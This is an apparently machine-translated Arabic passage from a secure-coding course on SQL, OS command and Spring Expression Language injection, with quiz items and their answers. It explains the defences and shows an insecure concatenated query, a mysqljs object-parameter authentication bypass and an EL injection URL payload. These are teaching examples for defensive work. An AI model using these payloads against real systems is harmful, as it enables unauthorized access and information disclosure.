*ربما تكون العبارات ذات المعلمات ، *المعروفة أيضا باسم *الاستعلامات ذات المعلمات* ، هي أفضل طريقة لمواجهة هجمات حقن SQL إذا كنت تقوم بإنشاء أوامر SQL مباشرة يجب أن تكون آمنة. العبارات ذات المعلمات هي عبارات تتيح لك تحديد العناصر النائبة (غالبا ما تكون "**؟** ") للبيانات التي يجب الهروب منها. ثم تأخذ المكتبة الموجودة مسبقا التي تقوم باستدعائها هذه المعلمات وفي الواقع تهرب من البيانات بشكل صحيح لهذا التنفيذ المحدد. يعتمد بناء الجملة الدقيق للعناصر النائبة على المكتبة و/أو قاعدة البيانات التي تستخدمها.

لأغراضنا ، * يقوم بيان معد* بتجميع البيان مع نظام قاعدة البيانات في وقت مبكر بحيث يمكن تنفيذ طلب لاحق مع بيانات محددة بشكل أكثر كفاءة. يمكن أن يؤدي إعداد بيان باستخدام قاعدة بيانات في وقت مبكر إلى تحسين الأداء إذا كان سيتم تنفيذ البيان عدة مرات. تتضمن واجهات برمجة التطبيقات للبيان المعد بشكل عام دعما للبيانات ذات المعلمات ، ويستخدم العديد من الأشخاص (وواجهات برمجة التطبيقات) المصطلحين "البيان المعد" و "البيان ذي المعلمات" كمرادفات.

بالنسبة للأمان ، فإن المفتاح هو استخدام واجهة برمجة تطبيقات مع عبارات معلمة (بما في ذلك واجهة برمجة تطبيقات بيان معدة) والتأكد من إرسال كل إدخال غير موثوق به كمعلمة منفصلة. تأكد من عدم ** تضمين إدخال غير موثوق به عادة عن طريق ربط البيانات غير الموثوق بها كسلسلة (بما في ذلك سلسلة منسقة) في طلب.

##### مزايا البيانات ذات المعلمات / المعدة

تحتوي معظم لغات البرمجة على مكتبة واحدة على الأقل تنفذ عبارات ذات معلمات و / أو بيانات معدة. استخدام البيانات ذات المعلمات ، بما في ذلك باستخدام البيانات المعدة ، له العديد من المزايا:

1. نظرا لأن المكتبة تقوم بالهروب نيابة عنك ، فمن الأسهل استخدامها ومن المرجح أن تكون على حق.

2. يميل إلى إنتاج كود أسهل في الصيانة ، نظرا لأن الكود يميل إلى أن يكون أسهل في القراءة.

3. يمكن للكثيرين التعامل مع الاختلاف في محركات SQL المختلفة (وهو أمر مهم لأن الأنظمة المختلفة غالبا ما يكون لها قواعد بناء جملة مختلفة).

##### مثال: عبارات معدة في Java

فيما يلي مثال على استخدام العبارات المعدة في Java
باستخدام واجهة JDBC الخاصة به:

~~~~java
    String QueryString = "select * from authors where lastname = ?";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    pstmt.setString(1, search_lastname);
    ResultSet results = pstmt.execute( );
~~~~

هناك عبارات أكثر من المثال السابق، لكن العبارات أبسط. على وجه الخصوص ، أصبح التسلسل المعقد الآن ثابت سلسلة بسيط. ما زلنا نسمي شيئا يسمى "تنفيذ" **- ولكن تذكر أن تجنب الأساليب المسماة "تنفيذ" هو مجرد قاعدة أساسية لمساعدتنا في اكتشاف المشكلات المحتملة.**

ملاحظة: بعض البيانات ذات المعلمات و / أو البيان المعد
المكتبات ليست آمنة مؤشر ترابط. وبعبارة أخرى،
تفترض بعض المكتبات أنه في أي وقت يمكن لمؤشر ترابط واحد فقط
الوصول إلى مثيل.
هذا صحيح بالنسبة لواجهة برمجة تطبيقات بيان Java المعدة المستخدمة هنا ؛
واجهة برمجة تطبيقات Java هذه ليست آمنة للخيوط. لذلك عند استخدام واجهة Java هذه ،
تعريف `PreparedStatement` الكائنات فقط كمتغيرات على مستوى الطريقة
(بدلا من المتغيرات على مستوى الفصل) لتقليل مخاطر سلامة الخيط
المشاكل ، على النحو الذي اقترحه
[*جداول بوبي* (جافا).](https://bobby-tables.com/java)

بالطبع ، مثل أي تقنية ، إذا كنت تستخدمها بشكل خاطئ ، فلن تكون آمنة. فيما يلي مثال على كيفية استخدام العبارات المعدة في Java لإنتاج برنامج غير آمن على الأرجح:

~~~~java
    String QueryString = "select * from authors where lastname = '" + search_lastname + "';";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    ResultSet results = pstmt.execute( ); // Probably insecure, don’t do this!
~~~~

يستخدم هذا البرنامج غير الآمن عبارة معدة ، ولكن بدلا من استخدام "**؟ **" كعنصر نائب للقيمة (والذي سيتم بعد ذلك الهروب منه بشكل صحيح) ، يقوم هذا الرمز بربط البيانات مباشرة في الاستعلام. ما لم يتم الهروب من البيانات بشكل صحيح (ومن شبه المؤكد أنها ليست كذلك) ، يمكن أن يؤدي هذا الرمز بسرعة إلى ثغرة أمنية خطيرة إذا كان من الممكن التحكم في هذه البيانات بواسطة مهاجم.

##### أمثلة: عبارات معلمة ومعدة في بعض اللغات الأخرى

البيانات ذات المعلمات والمعدة متاحة على نطاق واسع ، على الرغم من أن
تختلف واجهات برمجة التطبيقات وبناء جملة العنصر النائب حسب لغة البرمجة والمكتبة وقاعدة البيانات.
هنا سنرى بعض الأمثلة.

يوجد في Python العديد من المكتبات التي تتفاعل مع قواعد البيانات.
يقوم العديد منهم بتنفيذ مواصفات واجهة برمجة تطبيقات قاعدة بيانات Python v2.0
([PEP 249](https://peps.python.org/pep-0249/)) ،
الذي `execute` `executemany` وطرق تنفيذ البيانات ذات المعلمات.
يتم الإبلاغ عن بناء جملة العنصر النائب للمكتبة حسب سمته `paramstyle` .
إليك مثال بسيط على Python من
وثائق مكتبة Python sqlite3
[بايثون (sqlite3)](https://docs.python.org/3/library/sqlite3.html):

~~~~python
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute("insert into test(d, ts) values (?, ?)", (today, now))
~~~~

في ما يلي مثال على استعلام أثناء التنقل من [وثائق go.dev حول الاستعلام](https://go.dev/doc/database/querying):

~~~~go
    rows, err := db.Query("SELECT * FROM album WHERE artist = ?", artist)
~~~~

عند استخدام Node و JavaScript ، هناك العديد من الطرق للاستخدام
بيانات ذات معلمات ومعدة.
فيما يلي مثال باستخدام واجهة رد الاتصال node-postgres ،
كما هو موضح في
[وثائق العقدة-postgres](https://node-postgres.com/features/queries):

~~~~javascript
    const text = 'INSERT INTO users(name, email) VALUES($1, $2) RETURNING *'
    const values = ['brianc', 'brian.m.carlson@gmail.com']
    client.query(text, values, (err, res) => { ....  })
~~~~

توفر واجهة PostgreSQL `libpq` C العديد من الوظائف ، مثل
موضح في [وثائق PostgreSQL (وظائف تنفيذ الأوامر):](https://www.postgresql.org/docs/current/libpq-exec.html)

* `PQexec` يقوم بتشغيل أمر سلسلة واحدة مباشرة وإرجاع نتيجة.
* `PQexecParams` ينفذ عبارة ذات معلمات.
  يتم تمثيل العناصر النائبة في الأمر ك `$1` `$2` ، ، وما إلى ذلك ،
  ويتم توفير قيم المعلمات كمعلمات منفصلة في نفس المكالمة.
* `PQprepare` ينفذ بيانا معدا.
  يأخذ بيان مع العناصر النائبة و
  يقدمها إلى قاعدة البيانات لإعدادها.
  يمكن للمستخدمين لاحقا استخدام المكالمة المنفصلة `PQexecPrepared` 
  لتوفير قيم معلمات العنصر النائب وتنفيذ الناتج
  أمر.

  يوفر [موقع OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) و [Bobby Tables](https://bobby-tables.com/) أمثلة لمجموعة متنوعة من النظم الإيكولوجية.

##### المشكلات الدقيقة: جانب DBMS (الخادم) مقابل جانب التطبيق (العميل)

قضية أمنية مهمة هي *حيث* 
تتم معالجة معلمات بيان المعلمات.
هناك خياران ، جانب DBMS وجانب التطبيق ، و
جانب DBMS أفضل من وجهة نظر أمنية.

من وجهة نظر أمنية ، من الأفضل أن تكون معلمات
تتم معالجة البيانات ذات المعلمات مباشرة
ضمن نظام إدارة قواعد البيانات (DBMS) ،
ويعرف أيضا باسم معالجة المعلمات "DBMS-side".
غالبا ما يطلق على هذا النهج "جانب الخادم" نظرا لأن العديد من أنظمة إدارة قواعد البيانات تستخدم ملف
بنية العميل / الخادم حيث يتصل العميل عبر شبكة
إلى نظام إدارة قواعد البيانات من جانب الخادم.
هناك العديد من المزايا لمعالجة المعلمات من جانب DBMS.
يحتوي نظام إدارة قواعد البيانات على المعلومات الحالية حول قواعد الهروب
(ويمكن في كثير من الأحيان استخدام آليات أكثر كفاءة من إضافة أحرف الهروب) ،
ولديها أيضا معلومات أخرى مثل ترميزات الأحرف ذات الصلة
وأنواع البيانات المتوقعة.
ربما الأهم من ذلك ، أن مطوري DBMS سيكون لديهم عادة
يقوم خبراء الأمن بمراجعة هذا الجزء من نظام DBMS.
ومع ذلك ، يمكن أن تتطلب معالجة المعلمات من جانب DBMS مزيدا من الجهد
التنفيذ ، لذلك تستخدم بعض المكتبات
معالجة معلمة "جانب التطبيق" بدلا من ذلك.

تحدث معالجة المعلمات "من جانب التطبيق" عند هروب المعلمة
يحدث داخل مكتبة *ليس* في  نظام إدارة قواعد البيانات ، ولكن بدلا من ذلك في التطبيق
مساحة المعالجة.
وهذا ما يسمى أيضا معالجة المعلمات "من جانب العميل".
يتم تنفيذ أنظمة معالجة المعلمات من جانب التطبيق بشكل عام
عن طريق إدخال أحرف الهروب مباشرة حيث تكون هناك حاجة إليها.
غالبا ما تكون معالجة المعلمات من جانب التطبيق أسهل في التنفيذ ، لذلك
تستخدم العديد من مكتبات DBMS هذا النهج.
المكتبات من جانب التطبيق أفضل من استدعاء الهروب مباشرة
آلية "باليد" في كل استخدام حيث يتم إضافة الهروب تلقائيا.

لسوء الحظ ، فإن معالجة المعلمات من جانب التطبيق بها ضعف:
قد يفسر جانب التطبيق المعلومات بشكل مختلف عن نظام إدارة قواعد البيانات.
هذا الضعف يمكن أن يؤدي إلى نقاط ضعف. على سبيل المثال:

1. قد تكون المكتبة من جانب التطبيق مخصصة لملف مختلف
   نسخة من نظام إدارة قواعد البيانات. قد يحتوي نظام إدارة قواعد البيانات على قائمة مختلفة من الأحرف
   أو المواقف التي تحتاج إلى الهروب.
2. قد تفسر المكتبة من جانب التطبيق الأحرف متعددة البايت
   بشكل مختلف أو لا تهرب من الأحرف متعددة البايت بشكل صحيح ل
   الظروف الموجودة بالفعل على جانب DBMS. (انظر
   [حرف متعدد البايت يستغل PHP / MySQL](https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql).)
3. إذا كانت المكتبة من جانب التطبيق تنفذ معلمة
   أنواع البيانات أكثر تعقيدا من الأرقام والسلاسل (مثل المصفوفات ،
   الكائنات والمصفوفات الترابطية و / أو القواميس) ، ثم هناك
   هو خطر كبير من وجود ثغرة أمنية.
   المشكلة الأساسية هي أن المكتبة من جانب التطبيق ليست كذلك
   تحليل لغة الاستعلام بنفس الطريقة التي يقوم بها نظام إدارة قواعد البيانات -
   إنه يقوم ببدائل نصية بسيطة. لذلك إذا نفذت المكتبة هذا
   الوظيفة ، يجب أن تقوم عادة *بتخمينات* الأنواع المتوقعة.
   على سبيل المثال ، قد يخمن أن المصفوفات الترابطية يتم إرسالها فقط
   إلى المكتبة عندما يكون ذلك معقولا في استعلام SQL ذي المعلمات.
   هذا التخمين ، للأسف ، قد يكون قابلا للاستغلال.
   هذا خطر خاص في اللغات التي لا تتطلب أنواعا ثابتة
   (معرفة وقت التحويل البرمجي بالأنواع) ، حيث أنه من الأسهل بكثير الحصول على ما هو غير متوقع
   الأنواع المعقدة في مكتبة لا يمكنها دائما التعامل معها بشكل آمن.
   على سبيل المثال ، مكتبة Node .js MySQL المستخدمة على نطاق واسع
   [mysqljs / mysql](https://github.com/mysqljs/mysql)
   اعتبارا من أوائل عام 2022 ، غالبا ما تكون قابلة للاستغلال من خلال مكتبتها ذات المعلمات
   *إذا* كان من الممكن إرسال كائن JavaScript كمعلمة إليه
   (انظر
   [العثور على تجاوز التفويض على موقع الويب الخاص بي](https://maxwelldulin.com/BlogPost?post=9185867776) بواسطة Maxwell Dulin (ꓘ)).

هذه المشكلة الأخيرة للمعالجة من جانب التطبيق
(قد لا يتم دائما الهروب من أنواع البيانات المعقدة بشكل صحيح)
يمكن أن يكون مربكا ، لذلك قد يساعد المثال.
في العقدة.js مكتبة mysqljs/mysql،
تخيل أن المهاجم تمكن من توفير
*كائن* `{password = 1}` JavaScript  كمعلمة كلمة المرور
(هذه ليست مجرد سلسلة ، ولكنها كائن جافا سكريبت فعلي).
تخيل الآن أن هذا الكائن مستخدم في استعلام SQL
<tt>حدد &#42; من الحسابات التي يكون فيها اسم المستخدم =؟ وكلمة المرور =</tt>؟ 
(لاحظ أن هذا معلمات).
ستقوم المكتبة بتوسيع التعبير داخليا بعد `AND`
في <tt> كلمة المرور = &# 96 ؛ كلمة المرور&#96; = 1</tt> لأن المكتبة بسيطة
استبدال النص الثاني `?`، دون ملاحظة أن كائن جافا سكريبت
لا معنى له في سياق هذا الاستعلام (سلسلة أو رقم
من المتوقع هنا).
سيقوم MYSQL DBMS بتفسير <tt>كلمة المرور = &#96;password&#96;</tt> 
ك 1 (صواب) ، ثم حدد أن هذا `1 = 1` صحيح.
النتيجة: سيكون هذا التعبير *صحيحا دائما*.
هذا الهروب غير الصحيح من نوع بيانات معقدة
يكفي لتجاوز المصادقة تماما في بعض المواقف.

لسوء الحظ ، يمكن أن تمثل هذه المشكلة الأخيرة تحديا لحلها:

1. الحل الآمن هو التأكد من أن أنواع البيانات المعقدة
   (لا يتم توسيع الأنواع الأخرى غير الأرقام والسلاسل) بواسطة
   مكتبات جانب التطبيق
   ما لم يضع المطور علامة عليها على وجه التحديد على أنها مسموح بها.
   قد يكون هذا غير عملي إذا كان التطبيق يعتمد بالفعل على هذا ،
   وقد لا توفر المكتبة طريقة لتعطيل الوظيفة بالكامل.
   على سبيل المثال ، يسمح mysqljs / mysql بالإعداد `stringifyObjects` إلى true
   عند الاتصال  ، `mysql.createConnection`ولكن في حين أن هذا يمكن أن يساعد ،
   هذا يعطل فقط الهروب من الكائنات العامة - لا يفعل ذلك
   تعطيل أنواع البيانات المعقدة الأخرى مثل المصفوفات.
2. الحل العام هو التحقق من كل نوع قبل الاتصال بالمكتبة.
   على سبيل المثال ، تتطلب أن تكون جميع البيانات المتوقع أن تكون سلاسل يجب أن تكون سلاسل.
   عادة ما يكون من السهل القيام بذلك بلغة مكتوبة بشكل ثابت
   إذا كانت اللغة تفرض الأنواع - فقط أعلن عن النوع المطلوب.
   قد يستغرق هذا الكثير من الوقت للتنفيذ باللغات التي لا تفعل ذلك
   فرض أنواع ثابتة ، وهناك أيضا
   خطر فقدان الشيك عند إنشاء أو تعديل الكود.
   ومع ذلك ، فإن هذا النهج أكثر مرونة.
   (انظر  ["العثور على حقن SQL غير مرئي عن طريق تجاوز وظائف الهروب في mysqljs / mysql"](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) بواسطة Flatt Security Inc. ، 2022-02-21.)

غالبا ما يكون من الصعب تحديد ما إذا كانت المكتبة تستخدم جانب نظام إدارة قواعد البيانات أو
المعلمات من جانب التطبيق ، وفي بعض الظروف
يتوفر فقط نهج من جانب التطبيق.
في بعض الحالات ، يجبر طلب بيان معد المكتبة على
استخدم المعالجة من جانب DBMS ، ولكن لا تفترض ذلك - تحقق من الوثائق.
إذا كان لديك خيار عملي ، فتفضل تنفيذ جانب DBMS.

##### الإجراءات المخزنة

تدعم العديد من أنظمة قواعد البيانات "الإجراءات المخزنة" ، أي
الإجراءات المضمنة في قاعدة البيانات نفسها.
إذا كنت تستخدم الإجراءات والأوامر المخزنة (مثل الاستعلامات)
يتم إنشاؤها ديناميكيا فيها ، ثم يمكنك الحصول عليها مرة أخرى
ثغرات حقن SQL.

مرة أخرى ، عادة ما يكون الحل الأفضل هو استخدام آلية استعلام ذات معلمات
عند إنشاء الأمر الديناميكي (على سبيل المثال ، SQL) داخل ملف
الإجراء المخزن. انتبه; في بعض الأنظمة التي تستخدمها بشكل صحيح
يمكن أن يكون صعبا بعض الشيء.

لمزيد من المعلومات حول استخدام الاستعلامات ذات المعلمات
في الإجراءات المخزنة، راجع وثائق مكتبتك،
[ورقة الغش في معلمات استعلام OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-examples)، و
[ورقة الغش في منع حقن OWASP SQL](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

##### عندما لا تعمل العبارات ذات المعلمات

في بعض الحالات ، البيانات ذات المعلمات (بما في ذلك
البيانات المعدة) لن ** تعمل.
تسمح العديد من واجهات برمجة تطبيقات العبارات ذات المعلمات فقط باستبدال قيم SQL ، لذلك
لا تسمح بمعلومات مختلفة مثل أسماء الجداول والأسماء
من الأعمدة، أو اتجاه ترتيب الفرز.

في هذه الحالات، قد تحتاج إلى إنشاء استعلام عن طريق ربط البيانات.
في هذه الحالات، تأكد *من* التحقق من صحة البيانات بعناية (باستخدام قائمة مسموح بها)
لذلك يسمح فقط بقيم محددة وآمنة.
غالبا ما تكون القائمة المسموح بها عبارة عن قائمة قصيرة بالقيم المسموح بها، أو على الأكثر
تعبير بسيط يسمح فقط بأحرف وأرقام ASCII.
الخطر في هذا النهج هو أنه إذا كان التحقق من الصحة
يتم تخطيه من أي وقت مضى (على سبيل المثال ، بعد بعض تغيير التعليمات البرمجية) ،
قد يصبح النظام ضعيفا للغاية.

ورقة [الغش في منع حقن OWASP SQL](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
لديه اقتراح لطيف: إذا كان *يجب عليك * القيام بهذا التسلسل ،
جعل مدخلات المستخدم *مختلفة* عما ستستخدمه بالفعل ، و
في خريطة البرنامج ، أدخل المستخدم القيم التي ستستخدمها.
إذا لم يكن إدخال المستخدم يحتوي على تعيين صالح، فارفض الإدخال.
هذا يزيد من احتمال حدوث تغيير في البرنامج
لن يؤدي إلى تسلسل المدخلات التي لم يتم التحقق من صحتها في استعلام ،
أو أنه سيتم اكتشاف المشكلة قبل الشحن.
على سبيل المثال ، في Python ، إذا كنت بحاجة إلى الكتابة إلى اسم جدول يوفره المستخدم ، فيمكنك القيام بما يلي:

~~~~python
    table_name_untrusted = request.get("table_name")  # This is untrusted, don't put this directly in the query!
    table_name_map = {"table1": "db.table1", "table2": "db.table2"}
    table_name = table_name_map[table_name_untrusted]
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute(f"insert into {table_name}(d, ts) values (?, ?)", (today, now)) # This is safe because we know that table_name can only take trusted values from table_name_map
~~~~

##### طرق أخرى لمواجهة حقن SQL

تستخدم العديد من البرامج تعيين الكائنات العلائقية (ORM). هذه مجرد تقنية لتحويل البيانات تلقائيا في قاعدة بيانات علائقية إلى كائن بلغة برمجة موجهة للكائنات والعودة ؛ ستقوم الكثير من المكتبات والأطر بذلك نيابة عنك. هذا جيد ، طالما يتم تنفيذ ORM باستخدام عبارات ذات معلمات أو شيء مكافئ لها. في الممارسة العملية ، فإن أي تنفيذ جيد ل ORM سيفعل ذلك. لذلك إذا كنت تستخدم ORM محترما ، فأنت تفعل ذلك بالفعل. ومع ذلك ، من الشائع في الأنظمة التي تستخدم ORMs أن تحتاج أحيانا إلى استخدام استعلامات SQL مباشرة ... وعندما تفعل ذلك ، استخدم عبارات ذات معلمات أو عبارات معدة.

تستخدم بعض التطبيقات مكتبة "منشئ الاستعلام" لإنشاء الأوامر (الاستعلامات) برمجيا من خلال سلسلة من الاستدعاءات بدلا من تضمين سلسلة أوامر. تتضمن بعض ORMs نظام منشئ الاستعلام. مرة أخرى ، سيستخدم منشئ الاستعلام الذي تم تنفيذه جيدا عبارات ذات معلمات أو ما شابه ذلك داخليا. لذلك إذا كنت تستخدم منشئ استعلام، فاستخدم منشئا يتم تنفيذه باستخدام عبارات ذات معلمات، وقم بتوفير بيانات غير موثوق بها كمعلمات منفصلة حتى يتمكن منشئ الاستعلام من استخدام العبارات ذات المعلمات بشكل صحيح.

هناك طرق أخرى ، بالطبع. يمكنك كتابة رمز الهروب الخاص بك ، ولكن من الصعب تصحيح ذلك ، وعادة ما يكون مضيعة للوقت نظرا لوجود مكتبات موجودة عادة للقيام بهذه المهمة.

باختصار ، فإن استخدام مكتبات العبارات ذات المعلمات بشكل صحيح يجعل من السهل كتابة تعليمات برمجية آمنة. بالإضافة إلى ذلك ، فإنها عادة ما تجعل التعليمات البرمجية أسهل في القراءة ، وتتعامل تلقائيا مع الاختلافات بين كيفية هروب قواعد البيانات من الأشياء ، وأحيانا تكون أسرع من القيام بهروب metacharacter بنفسك.

#### اختبار 3.2: حقن SQL

تعد عبارات \>\>Parameterized (بما في ذلك العبارات المعدة) إجراء مضادا قيما ضد حقن SQL ، ولكن يجب عليك استخدام العناصر النائبة لكل قيمة بيانات قد يمكن التحكم فيها بواسطة مهاجم. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

### حقن أوامر نظام التشغيل (شل)

نوع آخر من هجوم الحقن هو هجوم حقن نظام التشغيل (OS) ، المعروف أيضا باسم هجوم حقن القشرة. هذا مشابه لهجوم حقن SQL. تكمن المشكلة في أن المعلومات (عادة ما تكون نصية) ، بعضها موثوق به وبعضها من مهاجم ، يتم إرسالها إلى مترجم فوري ينفذ ما يتم إرساله. الفرق هو أنه بدلا من إرساله إلى قاعدة بيانات ، يتم إرسال هذا الخليط إلى مترجم أوامر نظام التشغيل ، المعروف أيضا باسم shell الأوامر.

تحتوي معظم الأنظمة على غلاف أمر واحد على الأقل. حتى الأنظمة المدمجة الصغيرة ، مثل أجهزة التلفزيون وأجهزة التوجيه ، غالبا ما تحتوي على غلاف أوامر بالداخل. الأصداف مفيدة للعديد من الأشياء ، بما في ذلك الجمع السريع بين البرامج ، والقيام ببعض الاستعلامات ، وتصحيح الأخطاء ، وما إلى ذلك. تحتوي العديد من الأنظمة الشبيهة ب Unix ، بما في ذلك توزيعات Linux النموذجية ، على قذائف متعددة متاحة بما في ذلك bash و dash و ksh و zsh و csh. يتم تثبيت واحد على الأقل من هؤلاء ك ** / bin / sh  أو ** / usr / bin / sh****. وبالمثل ، يأتي MacOS مع غلاف ويمكن تثبيت الآخرين بسهولة. تستخدم أنظمة Windows عادة قذائف مختلفة ذات بناء جملة مختلف جدا (**cmd .exe **أو **command .exe** أو PowerShell) ، ولكن لديهم قذائف أيضا.

shell هو برنامج يأخذ الأوامر مباشرة ويقوم بتشغيل البرامج حسب الأوامر. نظرا لأن هذا مفيد ، فإن العديد من لغات البرمجة تجعل من السهل الاتصال بالصدفة. على وجه الخصوص ، لدى العديد من اللغات طريقة لإنشاء استدعاء ديناميكيا إلى shell ثم تنفيذه. ومع ذلك ، من السهل ارتكاب الأخطاء عند دمج بيانات المهاجم في أمر يتم تشغيله بواسطة shell. على وجه الخصوص ، حاول تجنب إنشاء مزيج من الأوامر والبيانات المقدمة من المهاجم ديناميكيا ليتم تنفيذها بعد ذلك بواسطة shell. بدلا من ذلك ، حاول العثور على بديل أسهل في الاستخدام بشكل آمن.

إذا كان كل ما تريد القيام به هو استدعاء برنامج آخر وتمريره بعض المعلمات ، فحاول القيام بذلك دون إنشاء أمر shell ديناميكيا ثم تفسيره على الإطلاق! بدلا من ذلك ، حاول الاتصال بالبرنامج مباشرة. هذا أكثر كفاءة على أي حال ، وهذا أسهل بكثير (وأكثر احتمالا) أن يكون آمنا إذا كان أي من هذه المعلمات قد يتضمن بيانات من مهاجم. على سبيل المثال:

* في C ، تفضل **execve** (3) (لا يستخدم shell)  بدلا من استخدام **system(3) (**الذي يستخدم shell).

* في Python ، تفضل  استخدام shell = False (**الافتراضي) مع ** subprocess.run () أو subprocess.call () ، بدلا من استخدام **shell = True** أو **** ****os.system (**)**

* في JavaScript Node .js ، تفضل  استخدام shell = False (**الافتراضي) مع ** child_process.spawn () أو child_process.execFile ()  بدلا من استخدام **shell = True** أو **** **child_process.exec** ()****

باختصار: إذا رأيت رمزا يربط السلاسل (بما في ذلك السلاسل المنسقة) للتنفيذ بواسطة shell ، ويتضمن هذا التسلسل إدخالا غير موثوق به ، فكن قلقا للغاية. في حين أنه من الممكن القيام بذلك بشكل آمن ، فمن الأفضل تجنبه عندما تستطيع بشكل معقول.

إذا كان يجب عليك استدعاء برنامج من خلال shell ، وكذلك تضمين بعض البيانات التي قد يوفرها مهاجم ، فأنت بحاجة إلى استخدامه بشكل آمن. هذا في الواقع صعب إلى حد ما. كما هو الحال دائما ، *لا تستخدم قائمة الرفض*. هناك العديد من "قوائم الشخصيات الوصفية للقذيفة" الخاطئة لأنها تفتقد بعضها. لذلك إذا كنت ترسل بيانات عبر shell ، فأنت بحاجة إلى الهروب من كل حرف باستثناء تلك الموجودة في القائمة المسموح بها (الأحرف التي تعرف أنها *ليست* أحرف وصفية). بشكل عام ، A-Z و a-z و 0-9 ليست أحرف وصفية ، وبعد ذلك ، تحقق بعناية فائقة. تأكد من اقتباس كل شيء حسب الحاجة.

بالطبع ، إذا كنت تتصل ببرنامج بأي بيانات قد تكون من مهاجم ، فأنت بحاجة إلى التأكد من عدم إساءة تفسير البيانات. على سبيل المثال ، تأكد من تفسير خيارات سطر الأوامر بشكل صحيح ؛ إذا تمكن المهاجم من جعل الحرف الأولي "**-" أو "**/**"** في معلمة ، فقد يساء تفسيرها على أنها خيار أو دليل جذر. يجب تجنب أي شيء يتم تمريره (على سبيل المثال ، عن طريق المعلمة أو أي شيء آخر) بعناية لمنع الهجوم. يقودنا هذا إلى موضوع أسماء الملفات ، والذي سنغطيه بعد ذلك.

 يعد حقن أوامر نظام التشغيل سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 11 و 2021 CWE Top 25 # 5. إنه [CWE-78 ](https://cwe.mitre.org/data/definitions/78.html)، *التحييد غير الصحيح للعناصر الخاصة المستخدمة في أمر نظام التشغيل ("حقن أمر نظام التشغيل").*

#### اختبار 3.3: حقن أوامر نظام التشغيل (شل)

\>\>تجنب استدعاء shell نظام التشغيل دون داع عندما تريد ببساطة تشغيل برنامج آخر. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح. ليس فقط هو أكثر كفاءة ، ولكن غلاف نظام التشغيل يستجيب عادة لعدد كبير من الأحرف الخاصة التي قد تحتاج إلى التعامل معها لاستخدامها بشكل آمن. إذا لم تكن بحاجة إلى وظائفه الإضافية ، فلا فائدة من الاتصال من خلاله. بالطبع ، قد تكون هناك حالات تكون فيها قدراتها الإضافية ذات قيمة بالنسبة لك ؛ في هذه الحالات ، ستحتاج إلى توخي الحذر الشديد والهروب من الأحرف الوصفية لضمان عدم إساءة تفسير البيانات.

[تفسير]

### هجمات الحقن الأخرى

هناك العديد من أنواع هجمات الحقن الأخرى بخلاف حقن SQL وحقن أوامر نظام التشغيل. قد يكون هناك خطر حدوث هجوم حقن في أي وقت تقوم فيه بإرسال بيانات يتم التحكم فيها جزئيا بواسطة مستخدم غير موثوق به بتنسيق يحتوي على أحرف وصفية ، ويتم تعريفه على أنه لغة ، و / أو تتم معالجته بواسطة مترجم.

تتضمن الأمثلة التي قد يكون فيها خطر حدوث ثغرة أمنية في الحقن إنشاء وإرسال أوامر JSON و yaml و XML وبروتوكول الوصول الخفيف إلى الدليل (LDAP) والعديد من التنسيقات الأخرى إلى المكتبات والأطر والمكونات الأخرى التي تعتمد عليها ، بالإضافة إلى إخراجها للمستخدمين النهائيين. في جميع الحالات ، يتمثل أحد الحلول في استخدام واجهة برمجة التطبيقات التي تهرب تلقائيا من النص حسب الضرورة ، تماما مثل استخدام عبارات ذات معلمات عند إنشاء SQL.

يحدث أحد الاختلافات المثيرة للاهتمام لهجوم الحقن عندما يتم تنفيذ بعض التعبيرات عن غير قصد مرتين. يمكن أن يحدث هذا ، على سبيل المثال ، في بعض استخدامات لغة التعبير في إطار Spring Java المستخدم على نطاق واسع ، حيث يسمى الهجوم حقن لغة التعبير. هذه الثغرة الأمنية شائعة بشكل ملحوظ ، لذلك سنشرحها أكثر هنا.

تم تطوير "لغة التعبير" (EL) كجزء من مكتبة العلامات القياسية لصفحات خادم Java (JSTL) لتسهيل الحصول على البيانات من نموذج الكائن الأساسي. على سبيل المثال ، هذا:

> `<c:out value="person.address.street"/>`

هو اختصار مناسب ل:

> `<%=HTMLEncoder.encode(((Person)person).getAddress().getStreet())%>`

تكمن المشكلة في أنه في بعض الحالات ، من الممكن تفسير EL مرتين عند استخدام Spring نظرا لإصدارات وتكوينات معينة. على سبيل المثال `<spring:message>` `<spring:theme>`  ، `arguments` قد تفسر العلامات وضعف السمات التالية: `code` ، و ، ،  `text` `var`،  و `scope`، و . `message` على سبيل المثال ، `<spring:bind>` وقد `<spring:nestedpath>` يفسر ضعف السمة `path`. عندما يحدث هذا ، كما هو مذكور في[ "الرمز عن بعد مع حقن لغة التعبير](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)" بواسطة Amodio (2012) ، هل هذا طلب من النموذج:

> `http://vulnerable.com/foo?message=${applicationScope}`

إلى صفحة تحتوي على:

> `<spring:message text="" code="${param['message']}"></spring:message>`

يمكن أن يؤدي إلى إخراج يحتوي على معلومات الخادم الداخلية بما في ذلك classpath وأدلة العمل المحلية.

يعتمد حدوث المشكلة أم لا على إصدار Spring وحاوية Java Server Pages / Servlet (إن وجدت) وبعض خيارات التكوين. لمزيد من المعلومات ، راجع "حقن لغة التعبير" [بقلم Di Paola and Dabirsiaghi](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf) (2011) و "[رمز عن بعد مع حقن لغة التعبير[" بواسطة Amodio (2012) .](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)

